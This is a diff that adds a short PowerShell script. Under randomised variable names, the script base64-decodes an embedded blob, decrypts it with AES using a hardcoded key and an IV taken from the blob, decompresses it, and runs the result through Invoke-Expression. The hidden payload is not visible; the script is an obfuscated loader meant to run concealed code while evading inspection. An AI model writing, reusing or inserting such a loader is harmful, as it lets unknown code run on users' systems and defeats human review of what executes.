@@ -1,0 +1,18 @@
+$qidbq = New-Object "System.Security.Cryptography.AesManaged"
+$azfmpankj = [System.Convert]::FromBase64String("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")
+$iejyci = [System.Convert]::FromBase64String("dgn4ZNiBKTadgCuJac6ZI72M1YfiMFicwZyU/g9v754=")
+$qidbq.KeySize = 192
+$qidbq.Key = $iejyci
+$qidbq.BlockSize = 128
+$qidbq.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$qidbq.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$qidbq.IV = $azfmpankj[0..15]
+$mzrv = New-Object System.IO.MemoryStream
+$edvkhi = New-Object System.IO.MemoryStream(,$qidbq.CreateDecryptor().TransformFinalBlock($azfmpankj,16,$azfmpankj.Length-16))
+$nczzvf = New-Object System.IO.Compression.DeflateStream $edvkhi, ([IO.Compression.CompressionMode]::Decompress)
+$nczzvf.CopyTo($mzrv)
+$edvkhi.Close()
+$nczzvf.Close()
+$neza = [System.Text.Encoding]::UTF8.GetString($mzrv.ToArray())
+$qidbq.Dispose()
+Invoke-Expression($neza)
